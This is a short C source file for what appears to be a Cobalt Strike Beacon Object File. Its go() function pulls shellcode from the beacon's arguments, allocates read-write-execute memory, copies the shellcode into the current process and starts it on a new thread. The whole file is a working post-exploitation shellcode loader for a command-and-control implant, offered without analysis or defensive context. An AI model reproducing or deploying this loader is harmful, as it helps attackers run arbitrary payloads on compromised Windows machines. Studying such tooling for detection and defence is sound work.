#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT LPVOID   WINAPI   KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT BOOL     WINAPI   KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess (VOID);

VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
    datap   parser;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    LPVOID pMem;
    SIZE_T bytesWritten = 0;
    DWORD dwThreadId = 0;

    BeaconDataParse(&parser, Buffer, Length);
    lpShellcodeBuffer = (LPBYTE) BeaconDataExtract(&parser, (int*)(&dwShellcodeBufferSize));
    pMem = KERNEL32$VirtualAlloc(0, dwShellcodeBufferSize,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    KERNEL32$WriteProcessMemory(KERNEL32$GetCurrentProcess(), pMem, lpShellcodeBuffer, dwShellcodeBufferSize, &bytesWritten);
    KERNEL32$CreateThread(0, 0, pMem, 0, 0, &dwThreadId);
}